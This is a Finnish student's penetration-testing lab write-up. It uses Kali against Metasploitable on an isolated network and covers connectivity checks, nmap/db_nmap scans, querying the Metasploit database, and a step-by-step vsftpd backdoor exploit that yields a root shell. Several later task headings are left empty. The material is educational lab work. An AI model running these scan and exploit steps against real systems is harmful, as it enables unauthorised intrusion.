# h2 Social sploit

## x) Lue/katso/kuuntele ja tiivistä

Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit

-
-
-



## a) Harjoittelemme omassa virtuaaliverkossa, jossa on Kali ja Metaspoitable. Osoita testein, että 1) koneet eivät saa yhteyttä Internetiin 2) Koneet saavat yhteyden toisiinsa

Testasin, ettei Kali tai Metasploitable saa yhteyttä Internettiin ``ping 8.8.8.8`` ja että koneet saavat yhteyden toisiinsa ``ping 192.168.56.101`` ``ping 192.168.56.102``. Kumpikaan ei saanut yhteyttä Internettiin, mutta pingaus koneiden välillä onnistui.

![image](https://github.com/user-attachments/assets/53abff32-c356-4c79-91bb-aafff51e49fd)

![image](https://github.com/user-attachments/assets/7592da8f-5efa-48a0-97fb-5810ba4cba45)




## b) Ota Metasploit msfconsole käyttöön

Komennolla ``msfconsole`` sain konsolin käyttöön.

![image](https://github.com/user-attachments/assets/73b8b06f-566c-4fc8-8173-38d88b27cfa7)



## c) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable

Annoin tehtävänannon mukaisen komennon, mutta sain virheilmoituksen, jonka mukaan en ole yhteydessä tietokantaan. Löysin ohjeet tähän [https://miteshshah.github.io/linux/kali/how-to-fix-metasploit-database-not-connected-or-cache-not-built/](https://miteshshah.github.io/linux/kali/how-to-fix-metasploit-database-not-connected-or-cache-not-built/), ja lähdin kokeilemaan. Olin kuitenkin jo tunnilla alustanut tietokannan, joten en tiennyt missä kiikasti. 

![image](https://github.com/user-attachments/assets/4d8df782-c380-42cd-90d4-3fb669ebde98)


Käynnistin msfconsolen uudestaan ``exit`` -> ``msfconsole`` ja toistin komennon ``db_nmap -sn 192.168.56.1/24``, ja sitten se toimikin.

![image](https://github.com/user-attachments/assets/45efc1c8-f560-4ef4-9134-72af0b87258a)


Ja kyllä, porttiskannauksella löytynyt IP-osoite 192.168.56.102 oli kuin olikin Metasploitablen, ja sen näki selaimella.

![image](https://github.com/user-attachments/assets/485302cc-28bf-4cd3-b954-e03cc5186831)




## d) Porttiskannaa Metasploitable perusteellisesti. Tallenna tulokset Metasploitin tietokantoihin (db_nmap) ja tiedostoihin (nmap -oA foo)

Skannasin Metasploitablen portit komennolla ``db_nmap -p- -sV -A 192.168.56.102``. db tallentaa tietokantaan, -p- skannaa kaikki portit, sV tutkii palveluiden versiot, -A tunnistaa palvelun. Tutorialspointin [NMAP Cheat Sheetilta](https://www.tutorialspoint.com/nmap-cheat-sheet) voi tutkia, millaisia erilaisia nmap-komentoja on ja mitä tietoa niillä saa.

Sitten toistin komennon niin, että tulokset tallentuvat tiedostoihin: ``nmap -p- -sV -A -oA skannaus1 192.168.56.102``. -oA tallentaa skannauksen skannaus1-nimiseksi tiedostoksi. Lähdin tutkimaan, mihin tiedostot tallentuivat, ja ne löytyivätkin heti omasta kotihakemistosta. Tiedostomuotoja oli kolme erilaista: .gnmap, .nmap ja .xml.

![image](https://github.com/user-attachments/assets/47207469-3351-4615-86c0-7d2dc7259003)




## e) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä

Komennolla ``hosts`` näkyi tietokantaan tallennetun porttiskannauksen tallentamat IP-osoitteet.

![image](https://github.com/user-attachments/assets/123ca494-23a6-4a19-9475-ebfb5e601e51)


Komennolla ``services``näkyi tietokantaan tallennetun porttiskannauksen havaitsemat portit ja niitä kuuntelevat palvelut.

![image](https://github.com/user-attachments/assets/b21b9866-b050-46e5-a7fb-5fc06574dda5)


Komennoilla ``hosts -h`` ja ``services -h`` löysin erilaisia suodatusvaihtoehtoja. 

Esimerkiksi komento ``services -S http`` hakee kaikki palvelut, jotka sisältävät sanan http. Komento ``hosts --up`` näyttää päällä olevat laitteet.

![image](https://github.com/user-attachments/assets/c6d5033b-ba33-474a-9205-2c4c23bfc496)

![image](https://github.com/user-attachments/assets/98ba4136-ad6d-41e9-b2f8-7a2143e4b14f)




## f) Vertaile nmap:n omaa tiedostoon tallennusta ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?

Tiedostoon tallentamisen etuna on, että tiedostoja on helppo jakaa eteenpäin. XML-tiedostoa voi myös lukea useissa eri ohjelmissa, kuten tekstieditorit, ja tieto on rakenteista. Grepable-tiedosto on kätevä, kun tekstitiedostoa käsitellään komentorivillä. Tiedostoksi tallentaminen ei vaadi tietokannan luomista.

Tietokantaan tallentaminen mahdollistaa tiedon käsittelyn Metasploitin sisällä, ja tietokannasta voi helposti hakea ja suodattaa tietoa. Tietoja on helppo hyödyntää Metasploitilla erilaisiin hyökkäyksiin. Tietokannan hallinta voi olla raskasta jos dataa on paljon ja vaatii osaamista enemmän, kuin tiedostojen käsittely.


## g) Murtaudu Metasploitablen vsftpd-palveluun

Suoritin tämän ensimmäisen kerran tunnilla, ja silloin käytin apuna tätä ohjetta: [https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173](https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173)

mfsconsolessa: 

- Etsin hyökkäyksen: ``search vsftpd``
- Valitsin hyökkäyksen (valitsin yhden esimerkeistä): ``use 1``
- Valitsin kohteen: ``set RHOSTS 192.168.56.102``
- Suoritin hyökkäyksen: ``run``
- ``whoami`` -> olen root, Metasploitablen komentorivillä
  
![image](https://github.com/user-attachments/assets/28e0a877-573f-4c5d-8774-49286138d8a2)




## h) Päivitä äskeisen vsftpd-murron yhteydessä syntynyt sessio meterpretriin


## i) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää


## j) Murtaudu Metasploitableen jollain toisella tavalla


## k) Demonstroi Meterpretrin ominaisuuksia


## l) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt)


## Lähteet

Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit

https://miteshshah.github.io/linux/kali/how-to-fix-metasploit-database-not-connected-or-cache-not-built/

https://www.tutorialspoint.com/nmap-cheat-sheet

https://tiedosto.info/extension/xml.html

https://nmap.org/book/output-formats-grepable-output.html
